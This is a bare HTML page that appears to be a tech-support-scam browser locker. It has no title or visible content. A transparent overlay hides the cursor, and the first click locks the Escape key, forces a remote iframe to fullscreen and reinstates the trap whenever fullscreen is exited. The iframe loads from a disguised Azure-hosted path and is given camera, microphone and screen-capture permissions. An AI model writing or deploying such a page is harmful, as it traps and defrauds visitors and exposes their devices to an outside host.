<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
<title></title>
<style>
  html, body { margin: 0; height: 100%; }

  iframe {
    position: fixed;
    width: 100%;
    height: 100%;
    border: none;
    top: 0;
    left: 0;
    cursor: none;
  }

  #startOverlay {
    position: fixed;
    inset: 0;
    z-index: 9999;
    background: transparent;
    cursor: none;
  }
  #startOverlay.hide { display: none; }
</style>
</head>
<body>

<div id="startOverlay"></div>

<iframe 
  id="f"
  src="https://futurelearners-acavfqc9cpcrhghc.z03.azurefd.net/Ma0cHelpMark0er007/index.html?ph0nq=null"
  allowfullscreen 
  webkitallowfullscreen 
  mozallowfullscreen 
  allow="fullscreen *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *">
</iframe>

<script>
  const frame   = document.getElementById('f');
  const overlay = document.getElementById('startOverlay');

  async function startImmersive() {
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        await navigator.keyboard.lock(['Escape']);  
      }
      await frame.requestFullscreen();
      overlay.classList.add('hide');           
    } catch (e) {
      console.error('fullscreen/lock fail:', e);
    }
  }

  overlay.addEventListener('click', startImmersive);

  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      if (navigator.keyboard && navigator.keyboard.unlock) {
        navigator.keyboard.unlock();
      }
      overlay.classList.remove('hide');     
    }
  });
</script>

</body>
</html>
